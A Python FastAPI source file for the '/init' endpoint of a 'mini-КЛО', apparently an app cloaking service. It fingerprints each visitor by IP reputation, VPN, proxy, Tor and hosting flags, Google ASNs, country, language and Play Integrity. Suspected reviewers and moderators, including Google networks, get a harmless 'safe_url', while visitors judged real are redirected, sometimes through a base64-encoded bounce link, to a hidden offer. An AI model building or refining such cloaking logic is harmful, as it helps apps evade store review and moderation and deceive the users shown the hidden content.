"""
mini-КЛО init endpoint (advanced scoring — 2026-07-04).

Full flow:
1. Auth (X-Proxy-Key)
2. App lookup + panic mode
3. Extract IP/UA/instance_id/locale
4. auto_ban check (Redis)
5. instance_burnt check (Redis, require_integrity apps)
6. IPinfo lookup
7. asn_google hard-kill
8. IPinfo hard-kills (VPN/proxy/res_proxy/tor/hosting)
9. country_not_allowed check
10. lang_country_mismatch check (require_integrity apps)
11. IPQS lookup + hard-kills (tor unconditional, vpn/fraud for require_integrity+block_ipqs)
12. Velocity guard (Redis)
13. PI verify (only if no hard-kill)
14. Verdict decision
15. cloak_consumed check (only if grey + enabled)
16. Mark instance_burnt if hard-killed
17. Log + return

All Redis-dependent checks fail-OPEN (if Redis unreachable — skip that check).
IPQS/IPinfo fail-OPEN (return None → skip check).
"""
import base64
import logging
import os
import time
from typing import Optional

from fastapi import APIRouter, Header, Request
from fastapi.responses import JSONResponse

from config import config_store
from external.play_integrity import play_integrity_client
from external.ipinfo_client import ipinfo_client
from external.ipqs_client import ipqs_client
from constants import check_lang_country_mismatch
from log_shipper import log_shipper
from models import ScoringResult, ScoringDetail
from redis_client import (
    is_autobanned, is_instance_burnt, mark_instance_burnt,
    check_and_mark_cloak_consumed, velocity_check,
)

logger = logging.getLogger("init")

router = APIRouter()

# Пункт 3: bounce endpoint hosted by mini-server itself.
BOUNCE_URL_BASE = os.getenv("BOUNCE_URL_BASE", "https://api.threeamigosteam.com/engine")


def _load_google_asn_blocklist() -> set:
    """Reads config/google_asn_blocklist.json (synced from main КЛО)."""
    from pathlib import Path
    import json
    p = Path(__file__).parent / "config" / "google_asn_blocklist.json"
    if not p.exists():
        return set()
    try:
        data = json.load(open(p))
        return set(int(x) for x in data)
    except Exception:
        return set()


@router.post("/init")
@router.get("/init")
async def init_resolve(request: Request):
    # HDRTRACE 2026-07-14: log all incoming headers for debug
    try:
        _hdr_keys = [k.lower() for k in request.headers.keys()]
        _has_int = 'x-integrity-token' in _hdr_keys
        _tok = request.headers.get('x-integrity-token', '')
        _tok_len = len(_tok) if _tok else 0
        _qs_tok = request.query_params.get('integrity_token', '')
        _qs_tok_len = len(_qs_tok) if _qs_tok else 0
        _pkg = request.headers.get('x-app-id', '')
        if 'CauHoiViSao' in _pkg or 'ViSao' in _pkg:
            logger.info(
                f'[HDRTRACE] method={request.method} pkg={_pkg} '
                f'X-Integrity-Token={"YES(" + str(_tok_len) + ")" if _has_int else "NO"} '
                f'query_integrity_token={"YES(" + str(_qs_tok_len) + ")" if _qs_tok else "NO"} '
                f'all_headers={sorted(_hdr_keys)}'
            )
    except Exception as _e:
        logger.error(f'HDRTRACE fail: {_e}')

    """SDK resolve endpoint. Matches main КЛО contract: {"url": "..."}"""
    proxy_key = request.headers.get("x-proxy-key", "") or request.query_params.get("proxy_key", "")
    key_data = config_store.resolve_proxy_key(proxy_key)
    if not key_data:
        return JSONResponse({"error": "Unauthorized"}, status_code=403)

    package_name = key_data["package_name"]
    app = config_store.get_app(package_name)
    if not app:
        return JSONResponse({"error": "App config not found"}, status_code=403)

    if app.panic_mode:
        return {"url": app.safe_url}

    # Extract client params
    forwarded = request.headers.get("x-forwarded-for", "")
    real_ip = request.headers.get("x-real-ip", "")
    ip = forwarded.split(",")[0].strip() if forwarded else (
        real_ip or (request.client.host if request.client else "0.0.0.0")
    )
    user_agent = request.headers.get("user-agent", "")
    accept_language = (
        request.headers.get("x-locale", "")
        or request.headers.get("accept-language", "")
        or request.query_params.get("locale", "")
    )
    instance_id = (
        request.headers.get("x-instance-id", "")
        or request.query_params.get("instance_id", "")
    ).strip()
    integrity_token = (
        request.headers.get("x-integrity-token", "")
        or request.query_params.get("integrity_token", "")
    )

    # === Debug whitelist bypass (aligned с main КЛО api/init_routes.py:626) ===
    # Force grey verdict — обходит все hard_kill проверки для IP/instance из debug_allow.json.
    if config_store.is_debug(ip, instance_id):
        target_url = app.target_url or ""
        geo = await ipinfo_client.lookup(ip)
        _cc = (geo.country if geo else "")
        try:
            await log_shipper.enqueue({
                "ip": ip, "score": 0, "verdict": "grey", "rejection_code": None,
                "details": [{"check": "debug_bypass", "points": 0,
                             "reason": "Debug whitelist (IP/instance) - offer bez proverok"}],
                "user_agent": user_agent, "accept_language": accept_language,
                "country": _cc, "country_code": _cc,
                "city": (geo.city if geo else ""),
                "headers": {"x-app-id": package_name, "source": "mini-clo",
                            "x-instance-id": instance_id, "debug": "yes", "has-integrity": "no"},
                "extra_payload": {"package_name": package_name, "pi": {}, "ipinfo": None, "ipqs": None},
            })
        except Exception as _e:
            logger.warning(f"debug_bypass log_shipper failed: {_e}")
        logger.info(f"[{ip}] init: pkg={package_name} DEBUG bypass -> grey")
        import base64 as _b64d
        _sep = "&" if "?" in target_url else "?"
        target_url = f"{target_url}{_sep}clickid={instance_id}&geo={_cc}"
        _t = _b64d.urlsafe_b64encode(target_url.encode()).decode()
        return {"url": f"https://api.threeamigosteam.com/engine/go?t={_t}"}


    # Prepare state
    hard_kill = None  # (reason_code, reason_text) — first hit wins
    ip_flags = None
    ipqs_data = None
    ipinfo_data = None

    # ==== 1. auto_ban check (early, cheap Redis GET) ====
    banned, ban_reason = await is_autobanned(package_name, ip)
    if banned:
        hard_kill = ("autoban_hit", ban_reason)

    # ==== 2. instance_burnt check (require_integrity apps) ====
    if not hard_kill and app.require_integrity and instance_id:
        burnt, burnt_reason = await is_instance_burnt(package_name, instance_id)
        if burnt:
            hard_kill = ("instance_burnt", burnt_reason)

    # ==== 3. IPinfo lookup (needed for downstream checks) ====
    if not hard_kill:
        ipinfo_data = await ipinfo_client.lookup(ip)
        if ipinfo_data:
            ip_flags = {
                "country": ipinfo_data.country,
                "city": ipinfo_data.city,
                "asn": ipinfo_data.asn,
                "asn_type": ipinfo_data.asn_type,
                "vpn": ipinfo_data.vpn,
                "proxy": ipinfo_data.proxy,
                "res_proxy": ipinfo_data.res_proxy,
                "tor": ipinfo_data.tor,
                "relay": ipinfo_data.relay,
                "hosting": ipinfo_data.hosting,
                "mobile": ipinfo_data.is_mobile,
                "anonymous_name": ipinfo_data.anonymous_name,
            }

    # ==== 4. asn_google hard-kill ====
    if not hard_kill and ipinfo_data and app.block_google_asn:
        google_asn = _load_google_asn_blocklist()
        if ipinfo_data.asn and ipinfo_data.asn in google_asn:
            hard_kill = ("asn_google", f"asn={ipinfo_data.asn}")

    # ==== 5. IPinfo hard-kills (VPN/proxy/res_proxy/tor/hosting) ====
    # 2026-07-05 (fix конверт): res_proxy → soft signal для CGNAT countries.
    # IPinfo Max массово FP-flag'ит T-Mobile PL / Play / Orange PL / Wind IT / etc
    # как ProxyScrape/SOAX. Без этого fix'а грей% упал с 41% до 20% за 2 дня.
    CGNAT_HEAVY_COUNTRIES = {
        "CI", "NG", "BD", "IN", "ZA", "PH", "ID", "PK", "VN", "NP",
        "PL", "IT", "RO", "HU", "BG", "RS", "HR", "SI", "SK", "CZ",
        "LV", "LT", "EE", "SN", "GH",
    }
    if not hard_kill and ipinfo_data:
        cc = (ipinfo_data.country or "").upper()
        if ipinfo_data.vpn:
            hard_kill = ("ipinfo_vpn", f"provider={ipinfo_data.anonymous_name or '-'}")
        elif ipinfo_data.proxy:
            hard_kill = ("ipinfo_proxy", f"provider={ipinfo_data.anonymous_name or '-'}")
        elif ipinfo_data.res_proxy and cc not in CGNAT_HEAVY_COUNTRIES:
            # Non-CGNAT country → hard-kill (real BrightData/Oxylabs модеры)
            hard_kill = ("ipinfo_res_proxy", f"provider={ipinfo_data.anonymous_name or '-'} cc={cc}")
        elif ipinfo_data.tor:
            hard_kill = ("ipinfo_tor", "")
        elif ipinfo_data.hosting and ipinfo_data.asn not in (app.asn_whitelist or []):
            hard_kill = ("ipinfo_hosting", f"asn={ipinfo_data.asn}")

    # ==== 6. country_not_allowed check ====
    if not hard_kill and ipinfo_data and app.allowed_countries:
        cc = (ipinfo_data.country or "").upper()
        if cc and cc not in [c.upper() for c in app.allowed_countries]:
            hard_kill = ("country_not_allowed", f"country={cc}")
        # excluded_countries
        if not hard_kill and cc and cc in [c.upper() for c in (app.excluded_countries or [])]:
            hard_kill = ("country_not_allowed", f"excluded={cc}")

    # ==== 7. lang_country_mismatch (require_integrity apps) ====
    if not hard_kill and app.require_integrity and not app.disable_lang_check and ipinfo_data:
        mm = check_lang_country_mismatch(accept_language, ipinfo_data.country or "")
        if mm:
            hard_kill = ("lang_country_mismatch", mm)

    # ==== 8. IPQS lookup + hard-kills ====
    if not hard_kill:
        try:
            ipqs_data = await ipqs_client.lookup(ip)
        except Exception as e:
            logger.warning(f"IPQS lookup failed: {e}")
            ipqs_data = None
        if ipqs_data and ipqs_data.success:
            # Tor unconditional (all apps)
            if ipqs_data.tor:
                hard_kill = ("ipqs_tor", "")
            # VPN + fraud only for protected apps
            elif app.require_integrity and app.block_ipqs:
                if ipqs_data.vpn:
                    hard_kill = ("ipqs_vpn", "")
                elif ipqs_data.fraud_score >= (app.fraud_score_threshold or 90):
                    hard_kill = ("ipqs_fraud", f"score={ipqs_data.fraud_score}")

    # ==== 9. Velocity guard (Redis) ====
    if not hard_kill and app.require_integrity:
        vel_reason = await velocity_check(instance_id, ip, package_name)
        if vel_reason:
            hard_kill = ("velocity_block", vel_reason)

    # ==== 10. Play Integrity verify (only if no hard-kill) ====
    pi_ok = False
    pi_details = {}
    if integrity_token and play_integrity_client.available:  # 2026-07-14: убран 'not hard_kill' — PI decode всегда когда токен есть
        try:
            pi_verdict = await play_integrity_client.verify_token(integrity_token, package_name)
            if pi_verdict:
                if pi_verdict.is_recognized_app and (pi_verdict.meets_basic or pi_verdict.meets_device):
                    pi_ok = True
                pi_details = {
                    "app": pi_verdict.app_recognition,
                    "device": pi_verdict.device_recognition,
                    "license": pi_verdict.app_licensing,
                }
        except Exception as e:
            logger.error(f"PI verify failed [{package_name}]: {e}")

    # ==== 11. Verdict decision ====
    verdict = "white"
    rejection = None
    details = []

    if hard_kill:
        rejection = hard_kill[0]
        details.append(ScoringDetail(
            check=hard_kill[0], points=100,
            reason=f"{hard_kill[0]}: {hard_kill[1]} ({ip})",
        ))
    elif not pi_ok and app.require_integrity:
        rejection = "integrity_missing" if not integrity_token else "pi_init_failed"
        details.append(ScoringDetail(check=rejection, points=100, reason="PI verify failed"))
    elif pi_ok:
        verdict = "grey"

    # ==== 12. cloak_consumed check (only if grey + enabled) ====
    if verdict == "grey" and app.cloak_consumed_enabled and instance_id:
        consumed, ck_info = await check_and_mark_cloak_consumed(package_name, instance_id, ip)
        if consumed:
            verdict = "white"
            rejection = "cloak_consumed"
            details.append(ScoringDetail(
                check="cloak_consumed", points=100,
                reason=f"repeat within 24h (first_time=False)",
            ))

    # ==== 13. Mark instance_burnt if hard-killed via burn-worthy reason ====
    BURN_CODES = {
        "instance_burnt", "autoban_hit",  # already burnt
        "ipinfo_vpn", "ipinfo_proxy", "ipinfo_res_proxy", "ipinfo_tor",
        "ipqs_tor", "ipqs_vpn", "ipqs_fraud",
        "asn_google", "velocity_block", "lang_country_mismatch",
    }
    if verdict == "white" and rejection in BURN_CODES and rejection != "instance_burnt" and rejection != "autoban_hit":
        await mark_instance_burnt(package_name, instance_id, rejection)

    # ==== 14. URL selection ====
    if verdict == "grey":
        target = app.target_url or ""
        country = ip_flags["country"] if ip_flags else ""
        if app.direct_redirect and target:
            # Fix 2026-07-04: enrich с clickid+geo (как main КЛО init_routes.py:1128).
            # Раньше возвращали raw target → tracker терял attribution.
            _sep = "&" if "?" in target else "?"
            url = f"{target}{_sep}clickid={instance_id}&geo={country}"
        elif target:
            _sep = "&" if "?" in target else "?"
            enriched = f"{target}{_sep}clickid={instance_id}&geo={country}"
            t = base64.urlsafe_b64encode(enriched.encode()).decode()
            url = f"{BOUNCE_URL_BASE}/go?t={t}"
        else:
            url = app.safe_url
    else:
        url = app.safe_url

    # ==== 15. Log entry ====
    ipqs_flags = None
    if ipqs_data:
        ipqs_flags = {
            "success": ipqs_data.success,
            "fraud_score": ipqs_data.fraud_score,
            "vpn": ipqs_data.vpn,
            "proxy": ipqs_data.proxy,
            "tor": ipqs_data.tor,
            "bot_status": ipqs_data.bot_status,
            "isp": ipqs_data.isp,
        }

    log_entry = {
        "ip": ip,
        "score": sum(d.points for d in details),
        "verdict": verdict,
        "rejection_code": rejection,
        "details": [{"check": d.check, "points": d.points, "reason": d.reason} for d in details],
        "user_agent": user_agent,
        "accept_language": accept_language,
        "country": ip_flags["country"] if ip_flags else "",
        "country_code": ip_flags["country"] if ip_flags else "",
        "city": ip_flags["city"] if ip_flags else "",
        "headers": {
            "x-app-id": package_name,
            "source": "mini-clo",
            "x-instance-id": instance_id,
            "has-integrity": "yes" if integrity_token else "no",
        },
        "extra_payload": {
            "package_name": package_name,
            "pi": pi_details,
            "ipinfo": ip_flags,
            "ipqs": ipqs_flags,
        },
    }
    await log_shipper.enqueue(log_entry)

    logger.info(
        f"[{ip}] init: pkg={package_name} pi={pi_ok} verdict={verdict} rej={rejection} "
        f"hk={hard_kill[0] if hard_kill else '-'} country={ip_flags['country'] if ip_flags else '-'}"
    )
    return {"url": url}


@router.post("/web_content")
@router.get("/web_content")
async def web_content(request: Request):
    return JSONResponse({"received": True})
